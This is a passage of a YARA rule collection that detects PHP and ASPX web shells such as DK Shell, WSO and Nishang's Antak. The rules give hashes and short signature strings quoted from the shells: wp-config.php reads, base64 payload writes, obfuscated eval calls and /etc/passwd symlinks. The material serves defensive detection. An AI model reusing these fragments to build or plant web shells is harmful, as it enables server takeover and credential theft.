        hash3 = "65e7edf10ffb355bed81b7413c77d13d592f63d39e95948cdaea4ea0a376d791"
        hash4 = "ba87d26340f799e65c771ccb940081838afe318ecb20ee543f32d32db8533e7f"
        hash5 = "1fdf6e142135a34ae1caf1d84adf5e273b253ca46c409b2530ca06d65a55ecbd"

    strings:
        $s0 = "<form method=\"POST\"><input type=hidden name=act value=\"ls\">" fullword ascii
        $s2 = "foreach($quicklaunch2 as $item) {" fullword ascii
    condition:
        filesize < 882KB and all of them
}

rule Webshell_Ayyildiz {
    meta:
        id = "4FBjbL27w9wJTOFaqOsxD9"
        fingerprint = "v1_sha256_8441b7d730e337e002eeb7ae8f489e405409ddbe62f45bbc9a74c935d1d9fe66"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Webshell - rule generated from from files Ayyildiz Tim  -AYT- Shell v 2.1 Biz.txt, Macker's Private PHPShell.php, matamu.txt, myshell.txt, PHP Shell.txt"
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "0e25aec0a9131e8c7bd7d5004c5c5ffad0e3297f386675bccc07f6ea527dded5"
        hash2 = "9c43aada0d5429f8c47595f79a7cdd5d4eb2ba5c559fb5da5a518a6c8c7c330a"
        hash3 = "2ebf3e5f5dde4a27bbd60e15c464e08245a35d15cc370b4be6b011aa7a46eaca"
        hash4 = "77a63b26f52ba341dd2f5e8bbf5daf05ebbdef6b3f7e81cec44ce97680e820f9"
        hash5 = "61c4fcb6e788c0dffcf0b672ae42b1676f8a9beaa6ec7453fc59ad821a4a8127"

    strings:
        $s0 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\";" fullword ascii
        $s1 = "echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";" fullword ascii
    condition:
        filesize < 112KB and all of them
}

rule Webshell_zehir {
    meta:
        id = "6QAnAk5skNJF9ZaBDJW5Zt"
        fingerprint = "v1_sha256_c8fda66ada3581d2471b322ae65032b68c69b882c29f7469dd2ed78800c9c5f7"
        version = "1.0"
        score = 70
        date = "2016-01-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt"
        category = "INFO"
        reference = "https://github.com/nikicat/web-malware-collection"
        hash1 = "16e1e886576d0c70af0f96e3ccedfd2e72b8b7640f817c08a82b95ff5d4b1218"
        hash2 = "0c5f8a2ed62d10986a2dd39f52886c0900a18c03d6d279207b8de8e2ed14adf6"
        hash3 = "cb9d5427a83a0fc887e49f07f20849985bd2c3850f272ae1e059a08ac411ff66"
        hash4 = "b57bf397984545f419045391b56dcaf7b0bed8b6ee331b5c46cee35c92ffa13d"
        hash5 = "febf37a9e8ba8ece863f506ae32ad398115106cc849a9954cbc0277474cdba5c"

    strings:
        $s1 = "for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';" fullword ascii
        $s2 = "if (frmUpload.max.value<=0) frmUpload.max.value=1;" fullword ascii
    condition:
        filesize < 200KB and 1 of them
}

/*
    Yara Rule Set
    Author: Florian Roth
    Date: 2016-09-10
    Identifier: Webshells PHP bartblaze
*/

/* Rule Set ----------------------------------------------------------------- */

rule UploadShell_98038f1efa4203432349badabad76d44337319a6 {
    meta:
        id = "6qy8Q6Fo84VUgb2yCvtIOy"
        fingerprint = "v1_sha256_68f0de84a387a9af1a32dd8d38c66b002e16e1c954a51e6bc307580180faedbf"
        version = "1.0"
        date = "2016-09-10"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a web shell"
        category = "INFO"
        reference = "https://github.com/bartblaze/PHP-backdoors"
        hash1 = "506a6ab6c49e904b4adc1f969c91e4f1a7dde164be549c6440e766de36c93215"

    strings:
        $s2 = "$lol = file_get_contents(\"../../../../../wp-config.php\");" fullword ascii
        $s6 = "@unlink(\"./export-check-settings.php\");" fullword ascii
        $s7 = "$xos = \"Safe-mode:[Safe-mode:\".$hsafemode.\"] " fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 6KB and ( all of ($s*) ) ) or ( all of them )
}

rule DKShell_f0772be3c95802a2d1e7a4a3f5a45dcdef6997f3 {
    meta:
        id = "2MJjSwoaYhBPQVaRoPVvR1"
        fingerprint = "v1_sha256_81b0a08d1b9d3640e656a5cd08b79c0a2f940a2db5c2d939d19509f993514e86"
        version = "1.0"
        date = "2016-09-10"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a web shell"
        category = "INFO"
        reference = "https://github.com/bartblaze/PHP-backdoors"
        hash1 = "7ea49d5c29f1242f81f2393b514798ff7caccb50d46c60bdfcf61db00043473b"

    strings:
        $s1 = "<?php Error_Reporting(0); $s_pass = \"" ascii
        $s2 = "$s_func=\"cr\".\"eat\".\"e_fun\".\"cti\".\"on" ascii
    condition:
        ( uint16(0) == 0x3c0a and filesize < 300KB and all of them )
}

rule Unknown_8af033424f9590a15472a23cc3236e68070b952e {
    meta:
        id = "5YzLB0acXF4uYCHp8DW1zw"
        fingerprint = "v1_sha256_d7dc9a2a5e0800b5061cb2101d7cda023a6e637f1e7b14054fdb6a0b2cec6084"
        version = "1.0"
        date = "2016-09-10"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a web shell"
        category = "INFO"
        reference = "https://github.com/bartblaze/PHP-backdoors"
        hash1 = "3382b5eaaa9ad651ab4793e807032650667f9d64356676a16ae3e9b02740ccf3"

    strings:
        $s1 = "$check = $_SERVER['DOCUMENT_ROOT']" fullword ascii
        $s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
        $s3 = "fwrite($fp,base64_decode('" ascii
    condition:
        ( uint16(0) == 0x6324 and filesize < 6KB and ( all of ($s*) ) ) or ( all of them )
}

rule DkShell_4000bd83451f0d8501a9dfad60dce39e55ae167d {
    meta:
        id = "72ICGZ5ZW3xw0MkLxNQUI0"
        fingerprint = "v1_sha256_26d586e32d1b0b7800b4b61f592dadc3dd0583628e4cd3fa4e24e02067077da5"
        version = "1.0"
        date = "2016-09-10"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a web shell"
        category = "INFO"
        reference = "https://github.com/bartblaze/PHP-backdoors"
        hash1 = "51a16b09520a3e063adf10ff5192015729a5de1add8341a43da5326e626315bd"

    strings:
        $x1 = "DK Shell - Took the Best made it Better..!!" fullword ascii
        $x2 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
        $x3 = "echo '<b>Sw Bilgi<br><br>'.php_uname().'<br></b>';" fullword ascii

        $s1 = "echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
        $s9 = "$x = $_GET[\"x\"];" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 200KB and 1 of ($x*) ) or ( 3 of them )
}

rule WebShell_5786d7d9f4b0df731d79ed927fb5a124195fc901 {
    meta:
        id = "2Fv4NV4qWyzV09yXDB3RHc"
        fingerprint = "v1_sha256_348ccdf997965fbea791d835f1dd4e2c16d37a17ff4195e585fa4226f18faad6"
        version = "1.0"
        date = "2016-09-10"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a web shell"
        category = "INFO"
        reference = "https://github.com/bartblaze/PHP-backdoors"
        hash1 = "b1733cbb0eb3d440c4174cc67ca693ba92308ded5fc1069ed650c3c78b1da4bc"

    strings:
        $s1 = "preg_replace(\"\\x2F\\x2E\\x2A\\x2F\\x65\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x" ascii
        $s2 = "input[type=text], input[type=password]{" fullword ascii
    condition:
        ( uint16(0) == 0x6c3c and filesize < 80KB and all of them )
}

rule webshell_e8eaf8da94012e866e51547cd63bb996379690bf {
    meta:
        id = "403Bi7Ui9wKy6Tuhit0uiS"
        fingerprint = "v1_sha256_044491f0b07ef606aa76e70a07d161565f9cecf73e8f9f8db63cacc1c475b056"
        version = "1.0"
        date = "2016-09-10"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a web shell"
        category = "INFO"
        reference = "https://github.com/bartblaze/PHP-backdoors"
        hash1 = "027544baa10259939780e97dc908bd43f0fb940510119fc4cce0883f3dd88275"

    strings:
        $x1 = "@exec('./bypass/ln -s /etc/passwd 1.php');" fullword ascii
        $x2 = "echo \"<iframe src=mysqldumper/index.php width=100% height=100% frameborder=0></iframe> \";" fullword ascii
        $x3 = "@exec('tar -xvf mysqldumper.tar.gz');" fullword ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 100KB and 1 of ($x*) ) or ( 2 of them )
}

rule Unknown_0f06c5d1b32f4994c3b3abf8bb76d5468f105167 {
    meta:
        id = "27RKQKHioMhyVUHNmSOhZO"
        fingerprint = "v1_sha256_6f4bdf8aecd527335c29a8e964c7d8688c3e77419595d3fd10a6cf3704711816"
        version = "1.0"
        date = "2016-09-10"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a web shell"
        category = "INFO"
        reference = "https://github.com/bartblaze/PHP-backdoors"
        hash1 = "6362372850ac7455fa9461ed0483032a1886543f213a431f81a2ac76d383b47e"

    strings:
        $s1 = "$check = $_SERVER['DOCUMENT_ROOT'] . \"/libraries/lola.php\" ;" fullword ascii
        $s2 = "$fp=fopen(\"$check\",\"w+\");" fullword ascii
        $s3 = "fwrite($fp,base64_decode('" ascii
    condition:
        ( uint16(0) == 0x6324 and filesize < 2KB and all of them )
}

rule WSOShell_0bbebaf46f87718caba581163d4beed56ddf73a7 {
    meta:
        id = "4RT9J5URLf9M9EMKnPJBq1"
        fingerprint = "v1_sha256_bf5090fb909fea690c8a2af3cca35136eda3b9773976189158c25fb8877cc266"
        version = "1.0"
        date = "2016-09-10"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a web shell"
        category = "INFO"
        reference = "https://github.com/bartblaze/PHP-backdoors"
        hash1 = "d053086907aed21fbb6019bf9e644d2bae61c63563c4c3b948d755db3e78f395"

    strings:
        $s8 = "$default_charset='Wi'.'ndo.'.'ws-12'.'51';" fullword ascii
        $s9 = "$mosimage_session = \"" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and filesize < 300KB and all of them )
}

rule WebShell_Generic_1609_A {
    meta:
        id = "7FLqvVvkFVttmtEbEKqQ41"
        fingerprint = "v1_sha256_e5a4bba3a7b1c712203fcc8b85e4089b0ff18a26e96f5a04529616dbfb9de651"
        version = "1.0"
        date = "2016-09-10"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Auto-generated rule"
        category = "INFO"
        reference = "https://github.com/bartblaze/PHP-backdoors"
        super_rule = 1
        hash1 = "c817a490cfd4d6377c15c9ac9bcfa136f4a45ff5b40c74f15216c030f657d035"
        hash3 = "69b9d55ea2eb4a0d9cfe3b21b0c112c31ea197d1cb00493d1dddc78b90c5745e"

    strings:
        $s1 = "return $qwery45234dws($b);" fullword ascii
    condition:
        ( uint16(0) == 0x3f3c and 1 of them )
}

rule Nishang_Webshell {
    meta:
        id = "8EFs2mKOhlo7FRBiYsmSv"
        fingerprint = "v1_sha256_b8a3c8e80a4e41e556e2d65df4126d84723ded6ca623302afc4cc328bded346c"
        version = "1.0"
        date = "2016-09-11"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Florian Roth"
        description = "Detects a ASPX web shell"
        category = "INFO"
        reference = "https://github.com/samratashok/nishang"

    strings:
        $s1 = "psi.Arguments = \"-noninteractive \" + \"-executionpolicy bypass \" + arg;" ascii
        $s2 = "output.Text += \"\nPS> \" + console.Text + \"\n\" + do_ps(console.Text);" ascii
        $s3 = "<title>Antak Webshell</title>" fullword ascii
        $s4 = "<asp:Button ID=\"executesql\" runat=\"server\" Text=\"Execute SQL Query\"" ascii
    condition:
        ( uint16(0) == 0x253C and filesize < 100KB and 1 of ($s*) )
}
